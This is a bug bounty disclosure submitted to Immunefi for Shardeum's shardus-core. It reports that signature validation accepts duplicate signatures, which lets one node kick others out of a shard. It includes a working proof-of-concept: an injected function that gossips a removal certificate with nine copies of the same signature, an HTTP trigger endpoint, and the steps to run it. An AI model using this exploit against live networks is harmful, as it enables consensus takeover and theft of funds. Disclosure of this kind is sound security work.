# 33222 - \[BC - Critical] An attacker can control which nodes can and can...

Submitted on Jul 15th 2024 at 16:35:46 UTC by @infosec\_us\_team for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #33222

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)
* Direct loss of funds

## Description

## Background For Immunefi's Triagger

> *The trigger reviewing this report may not be as familiar with Shardeum's architecture and codebase as Shardeum's team itself, therefore, to facilitate their understanding of this report and its impact, we are dedicating this section to explain some important concepts of Shardus's Core.*

Sharduss' team shared via the Discord Channel of this Boost their interest in preventing malicious validators from manipulating which nodes join the active set, because by doing so they could take over a sufficient percentage of a shard's voting (by having malicious or modified nodes join a shard), therefore, the attacker would own the outcome of any consensus vote and be able to create any transaction outcome desired.

> The above was almost a word-by-word quote of Chris Chatbot's message: <https://discord.com/channels/787092485969150012/1256211020482084987/1259779922616913940>

Inspired by Shardu's concerns and request, we discovered during our research a way to kick any or all nodes from a shard, manipulating who can and cannot join a specific shard.

The impact of such actions was described above by the Shardeum's team.

## Summary

During the 1st and 2nd Quarter of every cycle, the nodes of a shard can sign a vote to remove a specific node from the network.

To pass the consensus it is required a min. amount of valid signatures.

Unfortunately, the function `shardus.validateClosestActiveNodeSignatures(...)`, which is used to verify the amount of signatures and their validity, does not check for duplicated signatures.

As a consequence, 1 node can Gossip a `remove-by-app` request containing the same signature (his signature) repeated an unlimited amount of times, to bypass the check for the min. requirement of signers.

This results in 1 node being able to kick anyone/everyone out of his shard, keeping only his other malicious nodes.

## Vulnerability Details

Below is the vulnerable function as a reference:

```
  validateClosestActiveNodeSignatures(
    signedAppData: any,
    signs: ShardusTypes.Sign[],
    minRequired: number,
    nodesToSign: number,
    allowedBackupNodes: number
  ): { success: boolean; reason: string } {
    let validNodeCount = 0
    // let validNodes = []
    let appData = { ...signedAppData }
    if (appData.signs) delete appData.signs
    if (appData.sign) delete appData.sign
    const hash = crypto.hashObj(appData)
    const closestNodes = this.getClosestNodes(hash, nodesToSign + allowedBackupNodes)
    const closestNodesByPubKey = new Map()
    for (let i = 0; i < closestNodes.length; i++) {
      const node = this.p2p.state.getNode(closestNodes[i])
      if (node) {
        closestNodesByPubKey.set(node.publicKey, node)
      }
    }
    for (let i = 0; i < signs.length; i++) {
      const sign = signs[i]
      const nodePublicKey = sign.owner
      appData.sign = sign // attach the node's sig for verification
      if (!closestNodesByPubKey.has(nodePublicKey)) {
        this.mainLogger.warn(`Node ${nodePublicKey} is not in the closest nodes list. Skipping`)
        continue
      }
      const node = closestNodesByPubKey.get(nodePublicKey)
      const isValid = this.crypto.verify(appData, nodePublicKey)
      if (node && isValid) {
        validNodeCount++
      }
      // early break loop
      if (validNodeCount >= minRequired) {
        // if (validNodes.length >= minRequired) {
        return {
          success: true,
          reason: `Validated by ${minRequired} valid nodes!`,
        }
      }
    }
    return {
      success: false,
      reason: `Fail to verify enough valid nodes signatures`,
    }
  }
```

> Code snippet from: <https://github.com/shardeum/shardus-core/blob/dev/src/shardus/index.ts#L1780-L1827>

As it can be seen by reading the function, there is nothing that prevents sending the same signature for the same owner multiple times, to bypass the `validNodeCount >= minRequired` check.

In the Proof of Concept section we'll describe how we created a malicious node that receives an **HTTP GET** request with the public key of any node within his shard and kicks him out.

This can be exploited to control which nodes can join your shard, hence, manipulating your percentage of a shard's voting.

## Proof of Concept

Download locally Shardus Core repo and Shardeum's repo, then point Shardeum to use the local copy of Shardu's Core.

> Steps to do so are well documented in the respective repos.

Below, we'll create a way for a malicious node to Gossip the exploit to the network.

In your local copy of Shardus Core, open the file `/src/shardus/index.ts` and add the following function:

```
  async infosec_gossipRemoveNode(pk: string): Promise<string> {

    let thenodes = nodeListFromStates([
      P2P.P2PTypes.NodeStatus.ACTIVE,
      P2P.P2PTypes.NodeStatus.READY,
      P2P.P2PTypes.NodeStatus.SYNCING,
    ]);

    this.mainLogger.warn(`INFOSEC: Trying to disconnect him: ${pk}`)
    console.log(`INFOSEC: Trying to disconnect him: ${pk}`)

    let certificate: P2P.LostTypes.RemoveCertificate = {
      nodePublicKey: pk, // Victim node
      cycle: CycleCreator.currentCycle - 2,
    };

    const hash = crypto.hashObj(certificate)

    const closestNodes = this.getClosestNodes(hash, 6);
    const closestNodesByPubKey = new Map()
    for (let i = 0; i < closestNodes.length; i++) {
      const node = this.p2p.state.getNode(closestNodes[i])
      if (node) {
        closestNodesByPubKey.set(node.publicKey, node)
      }
    }

    let ourPublicKey = Self.getPublicNodeInfo(true).publicKey;
    if (!closestNodesByPubKey.has(ourPublicKey)) {
      this.mainLogger.warn(`INFOSEC: WE ARE NOT in the closest nodes list.`)
      console.log(`INFOSEC: WE ARE NOT in the closest nodes list.`)
      return "INFOSEC: WE ARE NOT in the closest nodes list.";
    }

    let oursig = this.crypto.sign(certificate).sign;

    certificate.signs = [
      { owner: oursig.owner, sig: oursig.sig },
      { owner: oursig.owner, sig: oursig.sig },
      { owner: oursig.owner, sig: oursig.sig },
      { owner: oursig.owner, sig: oursig.sig },
      { owner: oursig.owner, sig: oursig.sig },
      { owner: oursig.owner, sig: oursig.sig },
      { owner: oursig.owner, sig: oursig.sig },
      { owner: oursig.owner, sig: oursig.sig },
      { owner: oursig.owner, sig: oursig.sig },
    ];

    Comms.sendGossip(
      'remove-by-app',
      certificate, // payload
      'trackthis', // tracker
      Self.id, // sender
      thenodes
    )

    console.log(`INFOSEC: Final object we are going to send: ${JSON.stringify(certificate)}`);

    return `Success: Current Quarter ${currentQuarter} (it only works during Quarter 1 and 2 of each cycle)`;
  }
```

In your local copy of Shardeum, open the file `/src/index.ts` and add the following function:

```
  shardus.registerExternalGet('infosec_gossipRemoveNode', externalApiMiddleware, async (req, res) => {
    const pk = req.query.pk as string;
    console.log(`INFOSEC: Target pk: ${pk}`);
    const result: string = await shardus.infosec_gossipRemoveNode(pk);
    return res.json(`INFOSEC: All good. Result: ${result}`);
  })
```

Build Shardus Core with `npm run build:dev`, build Shardeum with `npm ci && npm run prepare`, and - assuming that you are using the patch for running a network of 10 active nodes - start the network with 12 nodes or more nodes using `shardus start 12`

In our case, it takes anywhere from 15 minutes to 25 minutes for nodes to activate. Wait until the network is running.

Then visit the following link in your browser:

```
http://NODE_EXTERNAL_IP:NODE_EXTERNAL_PORT/infosec_gossipRemoveNode/?pk=PUBLIC_KEY_OF_ACTIVE_NODE_WITHIN_YOUR_SHARD_TO_KICK
```

Replace the placeholders **PUBLIC\_KEY\_OF\_ACTIVE\_NODE\_WITHIN\_YOUR\_SHARD\_TO\_KICK**, **NODE\_EXTERNAL\_IP**, and **NODE\_EXTERNAL\_PORT** with the correct values.
